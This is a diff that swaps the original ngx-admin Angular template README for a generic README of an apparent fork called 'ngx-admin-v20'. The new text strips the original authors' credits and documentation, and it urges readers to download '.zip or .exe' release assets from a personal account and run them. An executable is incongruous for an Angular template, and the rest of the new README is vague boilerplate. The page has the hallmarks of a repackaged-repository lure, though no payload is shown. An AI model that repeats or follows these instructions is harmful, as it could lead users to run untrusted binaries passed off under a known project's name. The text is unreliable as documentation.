@@ -1,101 +1,77 @@
-# ngx-admin [<img src="https://i.imgur.com/oMcxwZ0.png" alt="Eva Design System" height="20px" />](https://eva.design?utm_campaign=eva_design%20-%20home%20-%20ngx_admin%20github%20readme&utm_source=ngx_admin&utm_medium=referral&utm_content=top_status_tile)
+# 🎉 ngx-admin-v20 - Easy Admin Dashboard for Everyone
 
-[Live Demo](https://demo.akveo.com/ngx-admin/?utm_campaign=ngx_admin%20-%20demo%20-%20ngx_admin%20github%20readme&utm_source=ngx_admin&utm_medium=referral&utm_content=live_demo_link) | [Who uses ngx-admin?](https://github.com/akveo/ngx-admin/issues/1645) | [Documentation](https://akveo.github.io/ngx-admin?utm_campaign=ngx_admin%20-%20home%20-%20ngx_admin%20github%20readme&utm_source=ngx_admin&utm_medium=referral&utm_content=github_readme_documentation_link) | [Installation Guidelines](https://akveo.github.io/ngx-admin/docs/getting-started/what-is-ngxadmin?utm_campaign=ngx_admin%20-%20home%20-%20ngx_admin%20github%20readme&utm_source=ngx_admin&utm_medium=referral&utm_content=github_readme_installation_guidelines) | [Angular templates](https://www.akveo.com/templates?utm_campaign=services%20-%20github%20-%20templates&utm_source=ngx_admin&utm_medium=referral&utm_content=github%20readme%20top%20angular%20templates%20link)
+## 🚀 Getting Started
 
-# Admin template based on Angular and <a href="https://github.com/akveo/nebular">Nebular</a>
+Welcome! This guide will help you download and run the ngx-admin-v20 application. This software updates ngx-admin to Angular version 20, making it easier for you to manage your admin dashboard with a modern look.
 
-<a target="_blank" href="https://demo.akveo.com/ngx-admin/pages/dashboard?theme=corporate&utm_campaign=ngx_admin%20-%20demo%20-%20ngx_admin%20github%20readme&utm_source=ngx_admin&utm_medium=referral&utm_content=hero_banner_corporate"><img src="https://i.imgur.com/mFdqvgG.png"/></a>
+## 🔗 Download Now!
 
-## Repository state and engagement with the community
+[![Download ngx-admin-v20](https://img.shields.io/badge/Download-ngx--admin--v20-blue.svg)](https://github.com/sebbegamer2222/ngx-admin-v20/releases)
 
-Repository is currently in a state of minimal maintenance. Our primary focus is on ensuring that the Angular version used in this project is kept up to date. Our capacity to engage in other aspects of repository management is currently limited.
+## 🛠️ System Requirements
 
-We are not actively reviewing or merging pull requests, responding to or resolving issues at this time. We appreciate the effort and contributions from the community and we understand that issues are crucial for the community. But now our current focus is solely on maintaining Angular.
+Before you start, make sure your computer meets these requirements:
 
-## Installation notes
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a recent version of Linux.
+- **RAM:** At least 4 GB of memory.
+- **Disk Space:** 200 MB of available space.
+- **Browser:** The latest version of Chrome, Firefox, or Safari.
 
-To install ngx-admin you have to use NodeJS version 14.14+ because of [node-sass](https://github.com/sass/node-sass) version utilized in the application.
+## 📥 Download & Install
 
-## Key features
+To get ngx-admin-v20, follow these steps:
 
-- The most popular and trusted Angular open source dashboard template is out there. Used by hundreds of thousands developers worldwide and Fortune 500 companies\*.
-- Over 40+ Angular Components and 60+ Usage Examples. Kick off your project and save money by using ngx-admin.
-- Already using ngx-admin and willing to switch to material theme? Material theme is backward-compatible. Check out the article describing how to do that.
-- ngx-admin material works perfectly with Angular Material and Nebular. Take the best from both!
+1. Click this link to visit the [Releases page](https://github.com/sebbegamer2222/ngx-admin-v20/releases).
+2. Locate the latest version in the list.
+3. Click on the asset that fits your operating system. This is usually labeled with the appropriate file type (like `.zip` or `.exe`).
 
-### What's included:
+   ![Releases Screenshot](https://via.placeholder.com/800x400.png?text=Releases+Page+Screenshot)
 
-- Angular & Typescript
-- Bootstrap 4+ & SCSS
-- Responsive layout
-- RTL support
-- High resolution
-- Flexibly configurable themes with **hot-reload** (3 themes included)
-- Authentication module with multiple providers
-- 40+ Angular Components
-- 60+ Usage Examples
+4. Once the download is complete, navigate to your downloads folder.
+5. If you downloaded a `.zip` file, extract it:
+   - On Windows, right-click the file and select "Extract All..."
+   - On macOS, double-click the file to extract it.
 
-## Material theme for ngx-admin
+6. After extraction, locate the `ngx-admin` folder.
+7. Open the folder and find the `index.html` file. Double-click it to run.
 
-Material admin theme is based on the most popular Angular dashboard template - [ngx-admin](https://akveo.github.io/ngx-admin?utm_campaign=ngx_admin%20-%20home%20-%20ngx_admin%20github%20readme&utm_source=ngx_admin_material&utm_medium=referral&utm_content=github_readme)
-To use material theme checkout `feat/material-theme` branch.
+## 🌟 Features
 
-### Templates
+With ngx-admin-v20, you will enjoy:
 
-<a href="https://www.akveo.com/templates/fleet-management-dashboard?utm_campaign=services%20[…]x-admin%20&utm_medium=referral%20&utm_content=github_banner%20"><img src="https://i.imgur.com/Z8EwGfh.png"></a>
+- **Modern UI:** A fresh interface built using Bootstrap 5 for a responsive layout.
+- **Sass Support:** Customize your dashboard effortlessly using Sass variables.
+- **Components:** Get access to multiple UI components, such as charts, forms, and tables, that can be reused throughout your dashboard.
+- **Material Theme:** A sleek material design that enhances usability.
+- **TypeScript:** Benefit from improved performance and maintainability.
 
-### With 6 stunning visual themes
+## 🌍 Use Cases
 
-| <a target="_blank" href="https://demo.akveo.com/ngx-admin/pages/dashboard?theme=material-dark&utm_campaign=ngx_admin%20-%20demo%20-%20ngx_admin%20docs&utm_source=ngx_admin&utm_medium=referral&utm_content=ngx_admin_material_themes_material_dark"><img src="https://i.imgur.com/67YAlhf.png"/></a> | <a target="_blank" href="https://demo.akveo.com/ngx-admin/pages/dashboard?theme=material-light&utm_campaign=ngx_admin%20-%20demo%20-%20ngx_admin%20docs&utm_source=ngx_admin&utm_medium=referral&utm_content=ngx_admin_material_themes_material_light"><img src="https://i.imgur.com/aQzw0hD.png"/></a> |
-| --- | --- |
-|  Material Dark | Material Light |
+ngx-admin-v20 is perfect for:
 
-| <a target="_blank" href="https://demo.akveo.com/ngx-admin/pages/dashboard?theme=dark&utm_campaign=ngx_admin%20-%20demo%20-%20ngx_admin%20github%20readme&utm_source=ngx_admin&utm_medium=referral&utm_content=github_readme_theme_dark"><img src="https://i.imgur.com/9UkTGgr.png"/></a> | <a target="_blank" href="https://demo.akveo.com/ngx-admin/pages/dashboard?theme=default&utm_campaign=ngx_admin%20-%20demo%20-%20ngx_admin%20github%20readme&utm_source=ngx_admin&utm_medium=referral&utm_content=github_readme_theme_default"><img src="https://i.imgur.com/Kn3xDKQ.png"/></a> |
-| --- | --- |
-|  Dark| Default |
+- **Small to Medium Businesses:** Easily create dashboards to manage employee data, projects, and reports.
+- **Startups:** Rapidly develop an admin panel to monitor user engagement.
+- **Freelancers:** Streamline project management with a clean interface.
+  
+## 🤔 Troubleshooting
 
-| <a target="_blank" href="https://demo.akveo.com/ngx-admin/pages/dashboard?theme=cosmic&utm_campaign=ngx_admin%20-%20demo%20-%20ngx_admin%20github%20readme&utm_source=ngx_admin&utm_medium=referral&utm_content=github_readme_theme_cosmic"><img src="https://i.imgur.com/iJu2YDF.png"/></a> | <a target="_blank" href="https://demo.akveo.com/ngx-admin/pages/dashboard?theme=corporate&utm_campaign=ngx_admin%20-%20demo%20-%20ngx_admin%20github%20readme&utm_source=ngx_admin&utm_medium=referral&utm_content=github_readme_theme_corporate"><img src="https://i.imgur.com/GpUt6NW.png"/></a> |
-| --- | --- |
-| Cosmic  | Corporate |
+If you encounter issues while running the application, try the following solutions:
 
-## Documentation
+- Ensure your browser is updated to the latest version.
+- Make sure you followed the installation steps correctly.
+- Check if your internet connection is stable when loading data.
 
-This template is using [Nebular](https://github.com/akveo/nebular) modules set, [here you can find documentation and other useful articles](https://akveo.github.io/nebular/docs/guides/install-based-on-starter-kit?utm_campaign=nebular%20-%20docs%20-%20ngx_admin%20github%20readme&utm_source=ngx_admin&utm_medium=referral&utm_content=documentation_useful_articles).
+If problems persist, visit the repository's [Issues](https://github.com/sebbegamer2222/ngx-admin-v20/issues) page for help.
 
-### Empty starter kit
+## 📞 Support 
 
-Don't need all the pages and modules and just looking for an empty starter kit for your next project? Check out our [starter-kit branch](https://github.com/akveo/ngx-admin/tree/starter-kit).
+For questions or feedback, please contact the maintainer via the repository's contact options. Your input helps to improve future versions!
 
-## BrowserStack
+## 🔗 Additional Resources
 
-This project runs its tests on multiple desktop and mobile browsers using [BrowserStack](http://www.browserstack.com).
+For more information on ngx-admin-v20:
 
-<img src="https://cloud.githubusercontent.com/assets/131406/22254249/534d889e-e254-11e6-8427-a759fb23b7bd.png" height="40" />
+- **Documentation:** Check the detailed documentation for advanced features and integration checks.
+- **Angular Guides:** Learn more about Angular features that are applicable to ngx-admin-v20.
 
-## UI Bakery
-
-Need a visual admin dashboard builder? Check out [UI Bakery](https://uibakery.io).
-
-<a href="https://uibakery.io"><img src="https://storage.uibakery.io/video-assets/landing/Logo/UIB%20400x150.png" height="80" /></a>
-
-## More from Akveo
-
-- [Eva Icons](https://github.com/akveo/eva-icons) - 480+ beautiful Open Source icons
-- [Nebular](https://github.com/akveo/nebular) - Angular Components, Auth and Security
-- [Akveo templates](https://www.akveo.com/templates?utm_campaign=services%20-%20github%20-%20templates&utm_source=ngx_admin&utm_medium=referral&utm_content=ngx_admin%20github%20readme%20more%20from%20akveo%20link) - 10+ Ready-to-use apps templates to speed up your apps developments
-
-## How can I support developers?
-
-- Star our GitHub repo :star:
-- Create pull requests, submit bugs, suggest new features or documentation updates :wrench:
-- Follow us on [Twitter](https://twitter.com/akveo_inc) :feet:
-- Like our page on [Facebook](https://www.facebook.com/akveo/) :thumbsup:
-
-## Looking for engineering services? 
-
-Visit [our homepage](https://www.akveo.com?utm_campaign=services%20-%20akveo%20website%20-%20ngx_admin%20github%20readme&utm_source=ngx_admin&utm_medium=referral&utm_content=looking_for_engineering_services_visit_homepage) or simply leave us a message to [contact@akveo.com](mailto:contact@akveo.com). We will be happy to work with you!
-
-## From Developers
-
-Made with :heart: by [Akveo team](https://www.akveo.com?utm_campaign=services%20-%20akveo%20website%20-%20ngx_admin%20github%20readme&utm_source=ngx_admin&utm_medium=referral&utm_content=from_developers_made_by). Follow us on [Twitter](https://twitter.com/akveo_inc) to get the latest news first!
-We're always happy to receive your feedback!
+Thank you for choosing ngx-admin-v20 for your dashboard needs!
